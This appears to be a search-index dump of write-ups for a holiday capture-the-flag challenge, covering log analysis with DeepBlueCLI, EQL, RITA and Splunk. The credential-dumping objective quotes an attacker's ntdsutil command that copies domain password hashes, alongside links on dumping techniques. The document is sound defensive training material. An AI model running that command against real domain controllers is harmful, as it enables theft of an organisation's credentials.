\u21a9 \u21a9 https://www.sans.org/reading-room/whitepapers/malicious/user-agent-field-analyzing-detecting-abnormal-malicious-organization-33874 https://www-users.cs.umn.edu/~zhan3248/materials/technical_report.pdf https://user-agents.net/lookup http://useragentstring.com/index.php https://www.giac.org/paper/gcia/8443/60-seconds-wire-malicious-traffic/123928 https://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-user_agents.rules \u21a9 https://httpstatuses.com/400 \u21a9 https://threatpoint.checkpoint.com/ThreatPortal/threat?threatId=11021&threatType=malwarefamily \u21a9 https://attack.mitre.org/software/S0070/ https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage \u21a9 https://github.com/NextronSystems/APTSimulator \u21a9 https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml https://github.com/seanlinmt/suricata/blob/master/files/rules/emerging-user_agents.rules https://networkraptor.blogspot.com/p/user-agent-strings.html \u21a9 \u21a9 https://doc.emergingthreats.net/2002079 https://www.webmasterworld.com/search_engine_spiders/4809958.htm http://useragentstring.com/index.php?id=5363 \u21a9 \u21a9 https://doc.emergingthreats.net/2004114 \u21a9 https://docs.google.com/spreadsheets/d/1mY6BGYZgwPH3UiVAdxU4Hraa9n1gFLXSMcR_5mhs0GE/edit#gid=1694348953 \u21a9 https://www.spywareremove.com/removeAntiVirXP08.html \u21a9 https://community.rsa.com/thread/185439 https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml \u21a9 https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/fareit https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml \u21a9 \u21a9 https://app.any.run/tasks/7d7fa4a0-6970-4428-828b-29572abf9ceb/ \u21a9","title":"\ud83c\udf93 What you've learned"},{"location":"objectives/objective2/","text":"2. Unredact \ud83d\udcc4 Threatening Document \u00b6 Difficulty: \ud83c\udf84 Unredact Threatening Document Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad. \u26a1\ufe0f Solution \u00b6 After walking around the quad you will find the letter at north west corner of the quad. Open the file \ud83d\udce9 Letter To ElfU Personnel Copy the text to any text editor, You will get the following: Date: February 28, 2019 To the Administration, Faculty, and Staff of Elf University 17 Christmas Tree Lane North Pole From: A Concerned and Aggrieved Character Subject: DEMAND: Spread Holiday Cheer to Other Holidays and Mythical Characters... OR ELSE! Attention All Elf University Personnel, It remains a constant source of frustration that Elf University and the entire operation at the North Pole focuses exclusively on Mr. S. Claus and his year-end holiday spree. We URGE you to consider lending your considerable resources and expertise in providing merriment, cheer, toys, candy, and much more to other holidays year-round, as well as to other mythical characters. For centuries, we have expressed our frustration at your lack of willingness to spread your cheer beyond the inaptly-called \u201cHoliday Season.\u201d There are many other perfectly fine holidays and mythical characters that need your direct support year-round. If you do not accede to our demands, we will be forced to take matters into our own hands. We do not make this threat lightly. You have less than six months to act demonstrably. Sincerely, --A Concerned and Aggrieved Character The answer: DEMAND You have completed the Unredact \ud83d\udcc4 Threatening Document challenge! \ud83c\udf89 Extra I learned to always check the files for metadata which may reveal a lot. Examine the file metadata, You can use free tool like Exiftool or online service get-metadata . Bug After complete this objective you will not see any achievement notification at Achievements panel.","title":"2 Unredact Threatening Document"},{"location":"objectives/objective2/#2-unredact-threatening-document","text":"Difficulty: \ud83c\udf84 Unredact Threatening Document Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad.","title":"2. Unredact \ud83d\udcc4 Threatening Document"},{"location":"objectives/objective2/#solution","text":"After walking around the quad you will find the letter at north west corner of the quad. Open the file \ud83d\udce9 Letter To ElfU Personnel Copy the text to any text editor, You will get the following: Date: February 28, 2019 To the Administration, Faculty, and Staff of Elf University 17 Christmas Tree Lane North Pole From: A Concerned and Aggrieved Character Subject: DEMAND: Spread Holiday Cheer to Other Holidays and Mythical Characters... OR ELSE! Attention All Elf University Personnel, It remains a constant source of frustration that Elf University and the entire operation at the North Pole focuses exclusively on Mr. S. Claus and his year-end holiday spree. We URGE you to consider lending your considerable resources and expertise in providing merriment, cheer, toys, candy, and much more to other holidays year-round, as well as to other mythical characters. For centuries, we have expressed our frustration at your lack of willingness to spread your cheer beyond the inaptly-called \u201cHoliday Season.\u201d There are many other perfectly fine holidays and mythical characters that need your direct support year-round. If you do not accede to our demands, we will be forced to take matters into our own hands. We do not make this threat lightly. You have less than six months to act demonstrably. Sincerely, --A Concerned and Aggrieved Character The answer: DEMAND You have completed the Unredact \ud83d\udcc4 Threatening Document challenge! \ud83c\udf89 Extra I learned to always check the files for metadata which may reveal a lot. Examine the file metadata, You can use free tool like Exiftool or online service get-metadata . Bug After complete this objective you will not see any achievement notification at Achievements panel.","title":"\u26a1\ufe0f Solution"},{"location":"objectives/objective3/","text":"3. Windows Log Analysis: Evaluate Attack Outcome \u00b6 Difficulty: \ud83c\udf84 Evaluate Attack Outcome We're seeing attacks against the Elf U domain! Using the event log data , identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out. \u26a1\ufe0f Solution \u00b6 After completing Escape Ed Challenge and talk to Bushy Evergreen, He will give you a two hints which will help you with this objective. Deep Blue CLI on Github Github page for DeepBlueCLI Deep Blue CLI Posting Eric Conrad on DeepBlueCLI Password spraying attack example You can check the password spraying attack example by running processing the password-spray.evtx file in DeepBlueCLI: .\\DeepBlue.ps1 .\\evtx\\password-spray.evtx Given the hints, We will DeepBlueCLI tool to analysis the logs file. Download and extract the DeepBlueCLI tool . Open Powershell and run DeepBlueCLI to process the Security.evtx file using : .\\DeepBlue.ps1 .\\evtx\\Security.evtx | Out-GridView Out-GridView option used to get DeepBlueCLI output as GridView type. Running scripts is disabled on this system Error See the Set-ExecutionPolicy Readme if you receive a running scripts is disabled on this system error. After processing the file the DeepBlueCLI output will contains all password spay attacks: You will notice the following: The list of the accounts targeted by the attack: Targeted Usernames: ygoldentrifle esparklesleigh hevergreen Administrator sgreenbells cjinglebuns tcandybaubles bbrandyleaves bevergreen lstripyleaves gchocolatewine wopenslae ltrufflefig supatree mstripysleigh pbrandyberry civysparkles sscarletpie ftwinklestockings cstripyfluff gcandyfluff smullingfluff hcandysnaps mbrandybells twinterfig civypears ygreenpie ftinseltoes smary ttinselbubbles dsparkleleaves All each account attacked 77 times with explicit credentials except one account supatree was attacked 76 times: If we sort the events by date , We will get 3 interesting events with admin logons: Only this account supatree is included in the attacker targeted accounts: So the user account that the attacker compromised is supatree account. The answer: supatree Congratulations! You have completed the Windows Log Analysis: Evaluate Attack Outcome challenge! \ud83c\udf89 \ud83c\udf93 What you've learned \u00b6 Threat Hunting via Windows Event Logs. DeepBlueCLI Tool.","title":"3 Windows Log Analysis - Evaluate Attack Outcome"},{"location":"objectives/objective3/#3-windows-log-analysis-evaluate-attack-outcome","text":"Difficulty: \ud83c\udf84 Evaluate Attack Outcome We're seeing attacks against the Elf U domain! Using the event log data , identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out.","title":"3. Windows Log Analysis: Evaluate Attack Outcome"},{"location":"objectives/objective3/#solution","text":"After completing Escape Ed Challenge and talk to Bushy Evergreen, He will give you a two hints which will help you with this objective. Deep Blue CLI on Github Github page for DeepBlueCLI Deep Blue CLI Posting Eric Conrad on DeepBlueCLI Password spraying attack example You can check the password spraying attack example by running processing the password-spray.evtx file in DeepBlueCLI: .\\DeepBlue.ps1 .\\evtx\\password-spray.evtx Given the hints, We will DeepBlueCLI tool to analysis the logs file. Download and extract the DeepBlueCLI tool . Open Powershell and run DeepBlueCLI to process the Security.evtx file using : .\\DeepBlue.ps1 .\\evtx\\Security.evtx | Out-GridView Out-GridView option used to get DeepBlueCLI output as GridView type. Running scripts is disabled on this system Error See the Set-ExecutionPolicy Readme if you receive a running scripts is disabled on this system error. After processing the file the DeepBlueCLI output will contains all password spay attacks: You will notice the following: The list of the accounts targeted by the attack: Targeted Usernames: ygoldentrifle esparklesleigh hevergreen Administrator sgreenbells cjinglebuns tcandybaubles bbrandyleaves bevergreen lstripyleaves gchocolatewine wopenslae ltrufflefig supatree mstripysleigh pbrandyberry civysparkles sscarletpie ftwinklestockings cstripyfluff gcandyfluff smullingfluff hcandysnaps mbrandybells twinterfig civypears ygreenpie ftinseltoes smary ttinselbubbles dsparkleleaves All each account attacked 77 times with explicit credentials except one account supatree was attacked 76 times: If we sort the events by date , We will get 3 interesting events with admin logons: Only this account supatree is included in the attacker targeted accounts: So the user account that the attacker compromised is supatree account. The answer: supatree Congratulations! You have completed the Windows Log Analysis: Evaluate Attack Outcome challenge! \ud83c\udf89","title":"\u26a1\ufe0f Solution"},{"location":"objectives/objective3/#what-youve-learned","text":"Threat Hunting via Windows Event Logs. DeepBlueCLI Tool.","title":"\ud83c\udf93 What you've learned"},{"location":"objectives/objective4/","text":"4. Windows Log Analysis: Determine Attacker Technique \u00b6 Difficulty: \ud83c\udf84\ud83c\udf84 Determine Attacker Technique Using these normalized Sysmon logs , identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary . \u26a1\ufe0f Solution \u00b6 After completing Linux Path Challenge and talk to SugarPlum Mary, He will give you hints which will help you with this objective. Ross Wolf's work on EQL Check out some of Ross Wolf 's work on EQL. Sysmon Sysmon By Carlos Perez Event Query Language EQL Threat Hunting Look closer the solution is posted in this article by Joshua Wright ! Given the hints, We will eqllib tool to analysis the logs file: Getting the tool ready: Make sure you have python installed on your device or follow this guide to Install python , then install eqllib package for python. pip3 install eql Or You can download and run Slingshot Linux , where EQL is already installed and ready to go! Install jq to pretty-print the output data. To identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process, We need to understand how this attack work: Active Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller. 1 The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes: Volume Shadow Copy secretsdump.py Using the in-built Windows tool, ntdsutil.exe Invoke-NinjaCopy Let's try to find unexpected processes interacting with lsass.exe as parent process: eql query -f sysmon-data.json \"process where parent_process_name = 'LSASS.exe'\" | jq { \"command_line\" : \"C:\\\\Windows\\\\system32\\\\cmd.exe\" , \"event_type\" : \"process\" , \"logon_id\" : 999 , \"parent_process_name\" : \"lsass.exe\" , \"parent_process_path\" : \"C:\\\\Windows\\\\System32\\\\lsass.exe\" , \"pid\" : 3440 , \"ppid\" : 632 , \"process_name\" : \"cmd.exe\" , \"process_path\" : \"C:\\\\Windows\\\\System32\\\\cmd.exe\" , \"subtype\" : \"create\" , \"timestamp\" : 132186398356220000 , \"unique_pid\" : \"{7431d376-dedb-5dd3-0000-001027be4f00}\" , \"unique_ppid\" : \"{7431d376-cd7f-5dd3-0000-001013920000}\" , \"user\" : \"NT AUTHORITY\\\\SYSTEM\" , \"user_domain\" : \"NT AUTHORITY\" , \"user_name\" : \"SYSTEM\" } Search by unique process id as unique parent process id to see other processes started by this process: eql query -f sysmon-data.json 'process where ppid == 3440' | jq { \"command_line\" : \"ntdsutil.exe \\\"ac i ntds\\\" ifm \\\"create full c:\\\\hive\\\" q q\" , \"event_type\" : \"process\" , \"logon_id\" : 999 , \"parent_process_name\" : \"cmd.exe\" , \"parent_process_path\" : \"C:\\\\Windows\\\\System32\\\\cmd.exe\" , \"pid\" : 3556 , \"ppid\" : 3440 , \"process_name\" : \"ntdsutil.exe\" , \"process_path\" : \"C:\\\\Windows\\\\System32\\\\ntdsutil.exe\" , \"subtype\" : \"create\" , \"timestamp\" : 132186398470300000 , \"unique_pid\" : \"{7431d376-dee7-5dd3-0000-0010f0c44f00}\" , \"unique_ppid\" : \"{7431d376-dedb-5dd3-0000-001027be4f00}\" , \"user\" : \"NT AUTHORITY\\\\SYSTEM\" , \"user_domain\" : \"NT AUTHORITY\" , \"user_name\" : \"SYSTEM\" } The attacker used ntdsutil to create an accessible backup of the domain password hashes, and we can confirm it further by the create and ifm commands. The answer: ntdsutil Congratulations! You have completed the Windows Log Analysis: Determine Attacker Technique challenge! \ud83c\udf89 \ud83c\udf93 What you've learned \u00b6 Event Query Language (EQL). Threat Hunting using EQL. Credential Dumping techniques & tools. Credential dumping techniques, tools & detection: https://attack.mitre.org/techniques/T1003/ https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/ https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf https://2017.zeronights.org/wp-content/uploads/materials/ZN17_Kheirkhabarov_Hunting_for_Credentials_Dumping_in_Windows_Environment.pdf https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md \u21a9","title":"4 Windows Log Analysis - Determine Attacker Technique"},{"location":"objectives/objective4/#4-windows-log-analysis-determine-attacker-technique","text":"Difficulty: \ud83c\udf84\ud83c\udf84 Determine Attacker Technique Using these normalized Sysmon logs , identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary .","title":"4. Windows Log Analysis: Determine Attacker Technique"},{"location":"objectives/objective4/#solution","text":"After completing Linux Path Challenge and talk to SugarPlum Mary, He will give you hints which will help you with this objective. Ross Wolf's work on EQL Check out some of Ross Wolf 's work on EQL. Sysmon Sysmon By Carlos Perez Event Query Language EQL Threat Hunting Look closer the solution is posted in this article by Joshua Wright ! Given the hints, We will eqllib tool to analysis the logs file: Getting the tool ready: Make sure you have python installed on your device or follow this guide to Install python , then install eqllib package for python. pip3 install eql Or You can download and run Slingshot Linux , where EQL is already installed and ready to go! Install jq to pretty-print the output data. To identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process, We need to understand how this attack work: Active Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller. 1 The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes: Volume Shadow Copy secretsdump.py Using the in-built Windows tool, ntdsutil.exe Invoke-NinjaCopy Let's try to find unexpected processes interacting with lsass.exe as parent process: eql query -f sysmon-data.json \"process where parent_process_name = 'LSASS.exe'\" | jq { \"command_line\" : \"C:\\\\Windows\\\\system32\\\\cmd.exe\" , \"event_type\" : \"process\" , \"logon_id\" : 999 , \"parent_process_name\" : \"lsass.exe\" , \"parent_process_path\" : \"C:\\\\Windows\\\\System32\\\\lsass.exe\" , \"pid\" : 3440 , \"ppid\" : 632 , \"process_name\" : \"cmd.exe\" , \"process_path\" : \"C:\\\\Windows\\\\System32\\\\cmd.exe\" , \"subtype\" : \"create\" , \"timestamp\" : 132186398356220000 , \"unique_pid\" : \"{7431d376-dedb-5dd3-0000-001027be4f00}\" , \"unique_ppid\" : \"{7431d376-cd7f-5dd3-0000-001013920000}\" , \"user\" : \"NT AUTHORITY\\\\SYSTEM\" , \"user_domain\" : \"NT AUTHORITY\" , \"user_name\" : \"SYSTEM\" } Search by unique process id as unique parent process id to see other processes started by this process: eql query -f sysmon-data.json 'process where ppid == 3440' | jq { \"command_line\" : \"ntdsutil.exe \\\"ac i ntds\\\" ifm \\\"create full c:\\\\hive\\\" q q\" , \"event_type\" : \"process\" , \"logon_id\" : 999 , \"parent_process_name\" : \"cmd.exe\" , \"parent_process_path\" : \"C:\\\\Windows\\\\System32\\\\cmd.exe\" , \"pid\" : 3556 , \"ppid\" : 3440 , \"process_name\" : \"ntdsutil.exe\" , \"process_path\" : \"C:\\\\Windows\\\\System32\\\\ntdsutil.exe\" , \"subtype\" : \"create\" , \"timestamp\" : 132186398470300000 , \"unique_pid\" : \"{7431d376-dee7-5dd3-0000-0010f0c44f00}\" , \"unique_ppid\" : \"{7431d376-dedb-5dd3-0000-001027be4f00}\" , \"user\" : \"NT AUTHORITY\\\\SYSTEM\" , \"user_domain\" : \"NT AUTHORITY\" , \"user_name\" : \"SYSTEM\" } The attacker used ntdsutil to create an accessible backup of the domain password hashes, and we can confirm it further by the create and ifm commands. The answer: ntdsutil Congratulations! You have completed the Windows Log Analysis: Determine Attacker Technique challenge! \ud83c\udf89","title":"\u26a1\ufe0f Solution"},{"location":"objectives/objective4/#what-youve-learned","text":"Event Query Language (EQL). Threat Hunting using EQL. Credential Dumping techniques & tools. Credential dumping techniques, tools & detection: https://attack.mitre.org/techniques/T1003/ https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/ https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf https://2017.zeronights.org/wp-content/uploads/materials/ZN17_Kheirkhabarov_Hunting_for_Credentials_Dumping_in_Windows_Environment.pdf https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md \u21a9","title":"\ud83c\udf93 What you've learned"},{"location":"objectives/objective5/","text":"5. Windows Log Analysis: Determine Compromised System \u00b6 Difficulty: \ud83c\udf84\ud83c\udf84 Determine Attacker Technique The attacks don't stop! Can you help identify the IP address of the malware-infected system using these Zeek logs ? For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry . \u26a1\ufe0f Solution \u00b6 After completing Xmas Cheer laser Challenge and talk to Sparkle Redberry , He will give you hints which will help you with this objective: RITA RITA's homepage Watch | RITA - Finding Bad Things on Your Network Using Free and Open Source Tools RITA - Finding Bad Things on Your Network Using Free and Open Source Tools Watch | Tech Segment: RITA with John Strand - Enterprise Security Weekly 55 Tech Segment: RITA with John Strand - Enterprise Security Weekly #55 Unzip Zeek logs file. Open elfu-zeeklogs/ELFU/index.html file in your browser. Select ELFU database: Select Beacon from top menu to search for signs of beaconing behavior in and out of the network: You can see that we have one system that has almost a perfect score for beacon. Also we have 7660 different connections that are being made that is a lot of almost a perfect beacon. Score Source Destination Connections 0.998 192.168.134.130 144.202.46.214 7660 We can also look at longer connection you can the same source ip address at the top with longest connection duration. Source Destination DstPort:Protocol:Service Duration 192.168.134.130 148.69.64.76 443:tcp:-, 443:tcp:ssl 1035.9001 The IP address of the malware-infected system is 192.168.134.130 . The answer: 192.168.134.130 Congratulations! You have completed the Network Log Analysis: Determine Compromised System challenge! \ud83c\udf89 \ud83c\udf93 What you've learned \u00b6 Using RITA framework for network traffic analysis. Signs of beaconing behavior in and out of the network.","title":"5 Windows Log Analysis - Determine Compromised System"},{"location":"objectives/objective5/#5-windows-log-analysis-determine-compromised-system","text":"Difficulty: \ud83c\udf84\ud83c\udf84 Determine Attacker Technique The attacks don't stop! Can you help identify the IP address of the malware-infected system using these Zeek logs ? For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry .","title":"5. Windows Log Analysis: Determine Compromised System"},{"location":"objectives/objective5/#solution","text":"After completing Xmas Cheer laser Challenge and talk to Sparkle Redberry , He will give you hints which will help you with this objective: RITA RITA's homepage Watch | RITA - Finding Bad Things on Your Network Using Free and Open Source Tools RITA - Finding Bad Things on Your Network Using Free and Open Source Tools Watch | Tech Segment: RITA with John Strand - Enterprise Security Weekly 55 Tech Segment: RITA with John Strand - Enterprise Security Weekly #55 Unzip Zeek logs file. Open elfu-zeeklogs/ELFU/index.html file in your browser. Select ELFU database: Select Beacon from top menu to search for signs of beaconing behavior in and out of the network: You can see that we have one system that has almost a perfect score for beacon. Also we have 7660 different connections that are being made that is a lot of almost a perfect beacon. Score Source Destination Connections 0.998 192.168.134.130 144.202.46.214 7660 We can also look at longer connection you can the same source ip address at the top with longest connection duration. Source Destination DstPort:Protocol:Service Duration 192.168.134.130 148.69.64.76 443:tcp:-, 443:tcp:ssl 1035.9001 The IP address of the malware-infected system is 192.168.134.130 . The answer: 192.168.134.130 Congratulations! You have completed the Network Log Analysis: Determine Compromised System challenge! \ud83c\udf89","title":"\u26a1\ufe0f Solution"},{"location":"objectives/objective5/#what-youve-learned","text":"Using RITA framework for network traffic analysis. Signs of beaconing behavior in and out of the network.","title":"\ud83c\udf93 What you've learned"},{"location":"objectives/objective6/","text":"6. Splunk \u00b6 Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84 \ud83d\udcdc Info & Hints \u00b6 Splunk Access https://splunk.elfu.org/ as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas. Chat with Alice Bluebird after solving all training questions The File Archive contents You'll find some references to the File Archive contents in Splunk. Access the raw files or the File Archive link in the navigation. Starting point Start with this stoQ event index=main sourcetype=stoq \"results{}.workers.smtp.from\"=\"bradly buttercups <bradly.buttercups@eifu.org>\" | eval results = spath(_raw, \"results{}\") | mvexpand results | eval path=spath(results, \"archivers.filedir.path\"), filename=spath(results, \"payload_meta.extra_data.filename\"), fullpath=path.\"/\".filename | search fullpath!=\"\" | table filename,fullpath The message in the properties of the malicious document. stoQ puts metadata into the log management platform but it stores the raw artifacts in their entirety in the archive. Did you know that modern Word documents are (at their core) nothing more than a bunch of .xml files Find The message for Kent that the adversary embedded in this attack \u26a1\ufe0f Solution \u00b6 Given the hints this should be easy, our search query will be: index=main sourcetype=stoq \"results{}.workers.smtp.from\"=\"bradly buttercups <bradly.buttercups@eifu.org>\" | eval results = spath(_raw, \"results{}\") | mvexpand results | eval path=spath(results, \"archivers.filedir.path\"), filename=spath(results, \"payload_meta.extra_data.filename\"), fullpath=path.\"/\".filename | search fullpath!=\"\" | table filename,fullpath Searching for emails from bradly.buttercups@eifu.org then extract all filenames and fullpaths from the result using Splunk spath command. From the result we find core.xml mentioned in the hint: core.xml /home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4/core.xml Get file from server: https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts/home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4 Open the file in any text editor, and you will find the message: <cp:coreProperties xmlns:cp= \"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\" xmlns:dc= \"http://purl.org/dc/elements/1.1/\" xmlns:dcterms= \"http://purl.org/dc/terms/\" xmlns:dcmitype= \"http://purl.org/dc/dcmitype/\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <dc:title> Holiday Cheer Assignment </dc:title> <dc:subject> 19th Century Cheer </dc:subject> <dc:creator> Bradly Buttercups </dc:creator> <cp:keywords /> <dc:description> Kent you are so unfair. And we were going to make you the king of the Winter Carnival. </dc:description> <cp:lastModifiedBy> Tim Edwards </cp:lastModifiedBy> <cp:revision> 4 </cp:revision> <dcterms:created xsi:type= \"dcterms:W3CDTF\" > 2019-11-19T14:54:00Z </dcterms:created> <dcterms:modified xsi:type= \"dcterms:W3CDTF\" > 2019-11-19T17:50:00Z </dcterms:modified> <cp:category /> </cp:coreProperties> The answer: Kent you are so unfair. And we were going to make you the king of the Winter Carnival. \ud83d\udc68\u200d\ud83d\udd2c Dr. Banas Oh, thanks so much for your help! Sorry I was freaking out. I've got to talk to Kent about using my email again... ...and picking up my dry cleaning. As you noticed he is the only one coming to the university with short \ud83d\ude04! He actually freaked out and came quickly to fix the problem. Congratulations! You have completed Splunk challenge! \ud83c\udf89 \ud83c\udf93 What you've learned \u00b6 Th modern Word documents are (at their core) nothing more than a bunch of .xml files. Using Splunk spath command. StoQ puts metadata into the log management platform but it stores the raw artifacts in their entirety in the archive. Useful Resources from credit page Security Tools: stoQ - https://stoq.punchcyber.com PowerShell Empire - https://www.powershellempire.com Microsoft Sysmon - https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon Splunk Enterprise - https://www.splunk.com Challenge Back End: Serverless Stack - https://serverless-stack.com/ Challenge Front End: Chat Widget by Andre Madarang - https://codepen.io/drehimself/pen/KdXwxR December Holiday Color Pallette by gregxor - https://www.color-hex.com/color-palette/58295 S3 Bucket Listing by Rufus Pollock - https://github.com/rufuspollock/s3-bucket-listing Splunk Dev for all by David Veuve and Dave Herrald - https://splunkbase.splunk.com/app/4104/ CSS Pulse Effect by Floring Pop - https://www.florin-pop.com/blog/2019/03/css-pulse-effect CSS Pin/Unpin Effect by aaronogan - http://jsfiddle.net/aaronogan/45w2p7jz/ CSS Checkmark by gliesche - https://codepen.io/gliesche/pen/ZQyPeV CSS Modal by Jumar Muthaliar - https://jsfiddle.net/kumarmuthaliar/GG9Sa/1 CSS Snowflake Effect by pajasevi - https://pajasevi.github.io/CSSnowflakes/ JavaScript MD5 by BlueImp - https://github.com/blueimp/JavaScript-MD5","title":"6 Splnuk"},{"location":"objectives/objective6/#6-splunk","text":"Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"6. Splunk"},{"location":"objectives/objective6/#info-hints","text":"Splunk Access https://splunk.elfu.org/ as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas. Chat with Alice Bluebird after solving all training questions The File Archive contents You'll find some references to the File Archive contents in Splunk. Access the raw files or the File Archive link in the navigation. Starting point Start with this stoQ event index=main sourcetype=stoq \"results{}.workers.smtp.from\"=\"bradly buttercups <bradly.buttercups@eifu.org>\" | eval results = spath(_raw, \"results{}\") | mvexpand results | eval path=spath(results, \"archivers.filedir.path\"), filename=spath(results, \"payload_meta.extra_data.filename\"), fullpath=path.\"/\".filename | search fullpath!=\"\" | table filename,fullpath The message in the properties of the malicious document. stoQ puts metadata into the log management platform but it stores the raw artifacts in their entirety in the archive. Did you know that modern Word documents are (at their core) nothing more than a bunch of .xml files Find The message for Kent that the adversary embedded in this attack","title":"\ud83d\udcdc Info &amp; Hints"},{"location":"objectives/objective6/#solution","text":"Given the hints this should be easy, our search query will be: index=main sourcetype=stoq \"results{}.workers.smtp.from\"=\"bradly buttercups <bradly.buttercups@eifu.org>\" | eval results = spath(_raw, \"results{}\") | mvexpand results | eval path=spath(results, \"archivers.filedir.path\"), filename=spath(results, \"payload_meta.extra_data.filename\"), fullpath=path.\"/\".filename | search fullpath!=\"\" | table filename,fullpath Searching for emails from bradly.buttercups@eifu.org then extract all filenames and fullpaths from the result using Splunk spath command. From the result we find core.xml mentioned in the hint: core.xml /home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4/core.xml Get file from server: https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts/home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4 Open the file in any text editor, and you will find the message: <cp:coreProperties xmlns:cp= \"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\" xmlns:dc= \"http://purl.org/dc/elements/1.1/\" xmlns:dcterms= \"http://purl.org/dc/terms/\" xmlns:dcmitype= \"http://purl.org/dc/dcmitype/\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <dc:title> Holiday Cheer Assignment </dc:title> <dc:subject> 19th Century Cheer </dc:subject> <dc:creator> Bradly Buttercups </dc:creator> <cp:keywords /> <dc:description> Kent you are so unfair. And we were going to make you the king of the Winter Carnival. </dc:description> <cp:lastModifiedBy> Tim Edwards </cp:lastModifiedBy> <cp:revision> 4 </cp:revision> <dcterms:created xsi:type= \"dcterms:W3CDTF\" > 2019-11-19T14:54:00Z </dcterms:created> <dcterms:modified xsi:type= \"dcterms:W3CDTF\" > 2019-11-19T17:50:00Z </dcterms:modified> <cp:category /> </cp:coreProperties> The answer: Kent you are so unfair. And we were going to make you the king of the Winter Carnival. \ud83d\udc68\u200d\ud83d\udd2c Dr. Banas Oh, thanks so much for your help! Sorry I was freaking out. I've got to talk to Kent about using my email again... ...and picking up my dry cleaning. As you noticed he is the only one coming to the university with short \ud83d\ude04! He actually freaked out and came quickly to fix the problem. Congratulations! You have completed Splunk challenge! \ud83c\udf89","title":"\u26a1\ufe0f Solution"},{"location":"objectives/objective6/#what-youve-learned","text":"Th modern Word documents are (at their core) nothing more than a bunch of .xml files. Using Splunk spath command. StoQ puts metadata into the log management platform but it stores the raw artifacts in their entirety in the archive. Useful Resources from credit page Security Tools: stoQ - https://stoq.punchcyber.com PowerShell Empire - https://www.powershellempire.com Microsoft Sysmon - https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon Splunk Enterprise - https://www.splunk.com Challenge Back End: Serverless Stack - https://serverless-stack.com/ Challenge Front End: Chat Widget by Andre Madarang - https://codepen.io/drehimself/pen/KdXwxR December Holiday Color Pallette by gregxor - https://www.color-hex.com/color-palette/58295 S3 Bucket Listing by Rufus Pollock - https://github.com/rufuspollock/s3-bucket-listing Splunk Dev for all by David Veuve and Dave Herrald - https://splunkbase.splunk.com/app/4104/ CSS Pulse Effect by Floring Pop - https://www.florin-pop.com/blog/2019/03/css-pulse-effect CSS Pin/Unpin Effect by aaronogan - http://jsfiddle.net/aaronogan/45w2p7jz/ CSS Checkmark by gliesche - https://codepen.io/gliesche/pen/ZQyPeV CSS Modal by Jumar Muthaliar - https://jsfiddle.net/kumarmuthaliar/GG9Sa/1 CSS Snowflake Effect by pajasevi - https://pajasevi.github.io/CSSnowflakes/ JavaScript MD5 by BlueImp - https://github.com/blueimp/JavaScript-MD5","title":"\ud83c\udf93 What you've learned"},{"location":"objectives/objective7/","text":"7. Get Access To The Steam Tunnels \u00b6 Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84 \ud83d\udcdc Info & Hints \u00b6 Get Access To The Steam Tunnels Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name. For hints on achieving this objective, please visit Minty's dorm room and talk with Minty Candy Cane. Find first and last name of the one who took the turtle doves \u26a1\ufe0f 